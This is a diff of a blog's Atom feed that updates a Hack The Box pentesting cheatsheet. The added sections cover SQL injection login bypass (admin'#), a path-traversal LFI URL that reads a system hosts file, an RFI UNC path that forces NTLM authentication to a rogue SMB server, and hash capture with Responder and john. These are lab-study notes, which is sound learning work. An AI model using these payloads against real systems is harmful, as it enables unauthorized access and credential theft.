-&lt;h2 id=&quot;smb&quot;&gt;smb&lt;/h2&gt;
-
-&lt;p&gt;Stands for Server Message Block and is a protocol for file sharing between computers. It runs on port 445 by default.&lt;/p&gt;
-
-&lt;p&gt;The command line tool to interact with it, it’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbclient&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;To list shared directories:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient -L \\&amp;lt;ip&amp;gt;
-Enter WORKGROUP\gal&apos;s password:
-
-        Sharename       Type      Comment
-        ---------       ----      -------
-        ADMIN$          Disk      Remote Admin
-        C$              Disk      Default share
-        IPC$            IPC       Remote IPC
-        WorkShares      Disk
-SMB1 disabled -- no workgroup available
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Note the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\\&lt;/code&gt; prefix, this comes from Windows slahes.&lt;/p&gt;
-
-&lt;p&gt;Now, let’s connect to the shared:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient \\\\&amp;lt;ip&amp;gt;\\WorkShares
-Enter WORKGROUP\gal&apos;s password:
-Try &quot;help&quot; to get a list of possible commands.
-smb: \&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The commands to use once inside are the same as ftp&lt;/p&gt;
-
-&lt;h2 id=&quot;redis&quot;&gt;redis&lt;/h2&gt;
-
-&lt;p&gt;Redis is an in-memory key-value (NoSQL) database running on 6379 port by default&lt;/p&gt;
-
-&lt;p&gt;To connect to the database, we must use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;redis-cli&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;redis-cli -h &amp;lt;ip&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Once inside we can retrieve more information by using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;info&lt;/code&gt; command:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;ip&amp;gt;:6379&amp;gt; info
-# Server
-redis_version:5.0.7
-redis_git_sha1:00000000
-redis_git_dirty:0
-redis_build_id:66bd629f924ac924
-redis_mode:standalone
-os:Linux 5.4.0-77-generic x86_64
-arch_bits:64
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;To enumerate the database with some entries, we can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;info keyspace&lt;/code&gt; command. This information is present in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;info&lt;/code&gt; response as well.&lt;/p&gt;
-
-&lt;p&gt;To retrieve all the keys in a given database, we can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keys *&lt;/code&gt; command once we have selected the database. To access a particular key, we use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get&lt;/code&gt; command:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;redis-cli -h &amp;lt;ip&amp;gt;
-&amp;lt;ip&amp;gt;:6379&amp;gt; select 0
-OK
-&amp;lt;ip&amp;gt;:6379&amp;gt; keys *
-1) &quot;numb&quot;
-2) &quot;temp&quot;
-3) &quot;flag&quot;
-4) &quot;stor&quot;
-&amp;lt;ip&amp;gt;:6379&amp;gt; keys flag
-1) &quot;flag&quot;
-&amp;lt;ip&amp;gt;:6379&amp;gt; get flag
-&quot;flag&quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;rdp&quot;&gt;rdp&lt;/h2&gt;
-
-&lt;p&gt;Stands for Remote Desktop Protocol and runs on port 3389.&lt;/p&gt;
-
-&lt;p&gt;To connect, you can use Windows tool or if in Linux, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xfreerdp&lt;/code&gt; or any other alternative.&lt;/p&gt;
-
-&lt;p&gt;If checking a Windows machine, try first the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administrator&lt;/code&gt; user.&lt;/p&gt;
-
-&lt;h2 id=&quot;mongodb&quot;&gt;MongoDB&lt;/h2&gt;
-
-&lt;p&gt;MongoDB is a document based (NoSQL) database that runs by default on port 27017.&lt;/p&gt;
-
-&lt;p&gt;To connect to it, we should use the mongo shell, currently &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mongosh&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;To show all the database in the instance, use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;show dbs&lt;/code&gt; command.&lt;/p&gt;
-
-&lt;p&gt;To select a database: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;use &amp;lt;db&amp;gt;&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;To show all the collections in a database use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;show collections&lt;/code&gt; commands.&lt;/p&gt;
-
-&lt;p&gt;To show contents of all the documents inside a collection use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;db.&amp;lt;collection&amp;gt;.find().pretty()&lt;/code&gt;. It will pretty print the results.&lt;/p&gt;
-
-&lt;p&gt;Example:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mongosh &amp;lt;ip&amp;gt;
-Current Mongosh Log ID: 63999d00a5b1f19a65a9d84b
-Connecting to:          mongodb://&amp;lt;ip&amp;gt;:27017/?directConnection=true&amp;amp;appName=mongosh+1.6.1
-Using MongoDB:          3.6.8
-Using Mongosh:          1.6.1
-
-For mongosh info see: https://docs.mongodb.com/mongodb-shell/
-
-test&amp;gt; show dbs
-admin                  32.00 KiB
-config                 72.00 KiB
-local                  72.00 KiB
-sensitive_information  32.00 KiB
-users                  32.00 KiB
-test&amp;gt; show collections
-
-test&amp;gt; use sensitive_information
-switched to db sensitive_information
-sensitive_information&amp;gt; show collections
-flag
-sensitive_information&amp;gt; db.flag.find().pretty()
-[
-  {
-    _id: ObjectId(&quot;630e3dbcb82540ebbd1748c5&quot;),
-    flag: &apos;flag&apos;
-  }
-]
-sensitive_information&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;For reference check: &lt;a href=&quot;/pentesting-tools/&quot;&gt;pentesting tools.&lt;/a&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;directory-brute-force&quot;&gt;Directory brute force&lt;/h2&gt;
 
 &lt;p&gt;This is a technique useful to detect available paths for a web application. Also known as dir busting.&lt;/p&gt;
 
-&lt;p&gt;The technique consist in applying a directory and try all the combinations in the directoy to see if the web server returns a positive (200 OK) answer to the page. If so, we discover a page in that path.&lt;/p&gt;
+&lt;p&gt;The technique consist in using a list of words and try all the combinations in the dictionary to see if the web server returns a positive (200 OK) answer to the page. If so, we discover a page in that path.&lt;/p&gt;
 
-&lt;p&gt;A tool to perform this technique is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt;: &lt;a href=&quot;https://github.com/OJ/gobuster&quot;&gt;https://github.com/OJ/gobuster&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;The tools to perform this is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt;.&lt;/p&gt;
 
-&lt;p&gt;The following examples checks all the words in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/dict/american-english-small&lt;/code&gt; dictionary and searches for paths with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php&lt;/code&gt; extensions and stores the results in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/found&lt;/code&gt; and uses 20 threads:&lt;/p&gt;
+&lt;p&gt;For reference check: &lt;a href=&quot;/pentesting-tools/&quot;&gt;pentesting tools.&lt;/a&gt;&lt;/p&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster -x php -u http://&amp;lt;ip&amp;gt; -w /usr/share/dict/american-english-small -o /tmp/found -t 20  
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><summary type="html">I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the things I am learning.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Password protection for Github Pages</title><link href="https://www.agalera.eu/github-pages-password/" rel="alternate" type="text/html" title="Password protection for Github Pages" /><published>2022-09-06T00:00:00+02:00</published><updated>2022-09-06T00:00:00+02:00</updated><id>https://www.agalera.eu/github-pages-password</id><content type="html" xml:base="https://www.agalera.eu/github-pages-password/">&lt;p&gt;In this article I implement a workaround to protect with password a static page stored in Github pages.&lt;/p&gt;
+&lt;h2 id=&quot;sql-injections&quot;&gt;SQL Injections&lt;/h2&gt;
+
+&lt;p&gt;If the SQL queries are poorly built, it means that they are susceptible to SQL injections. If the user input is not sanitised, we can break up SQL queries that will cause problems, such as bypassing a login page.&lt;/p&gt;
+
+&lt;p&gt;A typical SQL query for a login page can look like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;members&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;admin&apos;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;admin&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If the input values are not sanitised, we can break the query by putting a comment character to comment the part of query that does the password checking:&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;members&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;admin&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; AND password = &apos;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kjdfjklsdf&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now the query becomes:&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;members&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;admin&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;therefore, the query is no longer checking for password and the login page is bypassed.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;username: admin&apos;#
+password: admin123 (any password will do the trick)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;You can find more SQL injections here: &lt;a href=&quot;https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/&quot;&gt;https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;local-file-include-lfi&quot;&gt;Local File Include (LFI):&lt;/h2&gt;
+
+&lt;p&gt;Abuse of file loading capability (for instance PHP include function) to show a local file in the browser:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://unika.htb/index.php?page=../../../../../../../../../../windows/system32/drivers/etc/hosts
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;remote-file-include-rfi&quot;&gt;Remote File Include (RFI):&lt;/h2&gt;
+
+&lt;p&gt;Remote file inclusion (RFI) is an attack targeting vulnerabilities in web applications that dynamically reference external scripts.&lt;/p&gt;
+
+&lt;p&gt;This can be use to force the target make a call to a compromised host in the same network and captura the credentials challenge:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://unika.htb/index.php?page=\\10.1.2.3\blabla\
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;ntlm&quot;&gt;NTLM&lt;/h2&gt;
+
+&lt;p&gt;Windows New Technology LAN Manager (NTLM) is a suite of security protocols offered by Microsoft to authenticate users’ identity and protect the integrity and confidentiality of their activity. At its core, NTLM is a single sign on (SSO) tool that relies on a challenge-response protocol to confirm the user without requiring them to submit a password.&lt;/p&gt;
+
+&lt;p&gt;In order to mess with it, you might use the &lt;a href=&quot;https://github.com/lgandx/Responder&quot;&gt;responder tool&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;The idea to bypass the NTLM is to force the target authenticate against a rogue SMB server (provided by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;responder&lt;/code&gt; tool). This tool will capture the authentication challenge hash and then you can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt; tool to compare the hash with a dictionary to see if any entry matches.&lt;/p&gt;
+
+&lt;p&gt;For reference check: &lt;a href=&quot;/pentesting-tools/&quot;&gt;pentesting tools.&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;shell-access&quot;&gt;Shell access&lt;/h2&gt;
+
+&lt;p&gt;Once you know the user passwword by using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;responder&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt; tool, you can use &lt;a href=&quot;https://github.com/Hackplayers/evil-winrm&quot;&gt;evil-winrm&lt;/a&gt; app to gain access to the target machine.&lt;/p&gt;
+
+&lt;p&gt;For reference check: &lt;a href=&quot;/pentesting-tools/&quot;&gt;pentesting tools.&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><summary type="html">I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the pentesting techniques I am learning.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Password protection for Github Pages</title><link href="https://www.agalera.eu/github-pages-password/" rel="alternate" type="text/html" title="Password protection for Github Pages" /><published>2022-09-06T00:00:00+02:00</published><updated>2022-09-06T00:00:00+02:00</updated><id>https://www.agalera.eu/github-pages-password</id><content type="html" xml:base="https://www.agalera.eu/github-pages-password/">&lt;p&gt;In this article I implement a workaround to protect with password a static page stored in Github pages.&lt;/p&gt;
 
 &lt;p&gt;&lt;!--more--&gt;&lt;/p&gt;
 
@@ -981,133 +1118,4 @@ iframe {
             &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;or&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;findFirstItemStartingWithB&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;items&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
             &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;orElseThrow&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;RuntimeException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;no item found&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;
     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="java9" /><category term="optional" /><category term="java9" /><category term="optional" /><summary type="html">I was implementing a searching algorithm and I had to search for two things. In this article I describe how I implemented combining two Java optionals.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/combine-optional/featured-image.jpeg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/combine-optional/featured-image.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Golang abstract class</title><link href="https://www.agalera.eu/golang-abstract-class/" rel="alternate" type="text/html" title="Golang abstract class" /><published>2021-09-24T00:00:00+02:00</published><updated>2021-09-24T00:00:00+02:00</updated><id>https://www.agalera.eu/golang-abstract-class</id><content type="html" xml:base="https://www.agalera.eu/golang-abstract-class/">&lt;p&gt;I’m doing a side project using golang, and I have a use case where I’d use an abstract class in Java.  Unfortunately, in golang the concept of classes does not exist.&lt;/p&gt;
-
-&lt;p&gt;In this article I describe how can I implement the behaviour I want without abstract class.&lt;/p&gt;
-
-&lt;p&gt;&lt;!--more--&gt;&lt;/p&gt;
-
-&lt;p&gt;I’m implementing an alert system in golang. When the alert needs to be activated, I want to play a sound through speakers and blink some LEDs for some period of time.&lt;/p&gt;
-
-&lt;p&gt;The behavior is quite simple, it needs to provide an implementation to enable the signaler, disable and query.&lt;/p&gt;
-
-&lt;p&gt;We will create two clases, one for playing sounds and another one for blinking the LEDs. And an abstract class to implement the shutdown after some period of time. Something similar to:&lt;/p&gt;
-
-&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;abstract&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Signaler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;enableForTime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seconds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;c1&quot;&gt;//Implementation to enable the signaler for x seconds&lt;/span&gt;
-    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;disable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;c1&quot;&gt;//Disable the signalers and cancel any pending timer&lt;/span&gt;
-    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;abstract&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;enable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;abstract&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;disableSignaler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;LedSignaler&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Signaler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
-    &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;enable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;c1&quot;&gt;//enable the LEDs&lt;/span&gt;
-    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
-    &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;disableSignaler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;c1&quot;&gt;//disable the LEDs&lt;/span&gt;
-    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SoundSignaler&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Signaler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
-    &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;enable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;c1&quot;&gt;//enable the speaker&lt;/span&gt;
-    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
-    &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;disableSignaler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;c1&quot;&gt;//disable the speaker&lt;/span&gt;
-    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The idea of this is to abstract the concrete implementation to the caller of the signaler.&lt;/p&gt;
-
-&lt;p&gt;This representation will work in any language that supports inheritance and abstract classes.&lt;/p&gt;
-
-&lt;h2 id=&quot;decorator-pattern&quot;&gt;Decorator pattern&lt;/h2&gt;
-
-&lt;p&gt;In golang, the concept of classes does not exist. So, we need to re-architecture the pattern.&lt;/p&gt;
-
-&lt;p&gt;Instead of using the abstract class, we can re-think the implementation to use a decorator pattern: &lt;a href=&quot;https://en.wikipedia.org/wiki/Decorator_pattern&quot;&gt;https://en.wikipedia.org/wiki/Decorator_pattern&lt;/a&gt;.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;The decorator pattern is a design pattern that allows behavior to be added to an individual object, dynamically, without affecting the behavior of other objects from the same class&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;It works by defining an interface that will have multiple implementation, we can add new functionalities by adding new implementations. Let’s go define the interface of the signaler:&lt;/p&gt;
-
-&lt;div class=&quot;language-golang highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Signaler&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;interface&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;Enable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;IsEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;Disable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Now, we can do the implementation of the sound signaler. To implement and interface in golang you need to provide a struct that has the same methods as the interface.&lt;/p&gt;
-
-&lt;div class=&quot;language-golang highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;soundSignaler&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;soundSignaler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Enable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
